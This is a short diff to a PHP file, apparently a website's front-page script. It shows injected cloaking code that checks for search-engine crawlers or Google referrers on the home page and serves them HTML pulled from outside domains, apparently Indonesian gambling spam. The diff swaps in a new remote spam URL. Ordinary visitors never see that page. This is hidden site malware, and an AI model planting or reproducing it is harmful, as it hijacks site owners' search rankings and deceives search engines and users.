@@ -4,7 +4,7 @@ $referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
 $uri = $_SERVER['REQUEST_URI'] ?? '';
 
 if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-echo file_get_contents('https://pub-a799bbbeb61543a7a1e6599f41766804.r2.dev/slot%20gacor.html');
+echo file_get_contents('https://plerkejepit.cc/lp/jubaedah.html');
 exit();
 }
 /**
